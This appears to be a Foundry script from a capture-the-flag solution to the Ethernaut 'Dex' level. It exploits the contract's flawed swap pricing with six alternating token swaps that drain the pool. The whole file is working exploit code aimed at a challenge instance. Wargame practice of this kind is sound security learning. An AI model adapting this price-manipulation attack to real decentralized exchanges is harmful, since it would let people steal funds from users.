// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import {Dex} from "../instances/Ilevel22.sol";

contract Attacker is Script {
    Dex level22 = Dex(0xAde3786475d685f56c63eAAC7335D0Bf8b6C9F75);
    address token1 = level22.token1();
    address token2 = level22.token2();

    function run() external {
        vm.startBroadcast();

        level22.approve(address(level22), type(uint256).max);

        level22.swap(token1, token2, 10);
        level22.swap(token2, token1, 20);
        level22.swap(token1, token2, 24);
        level22.swap(token2, token1, 30);
        level22.swap(token1, token2, 41);
        level22.swap(token2, token1, 45);

        vm.stopBroadcast();
    }
}
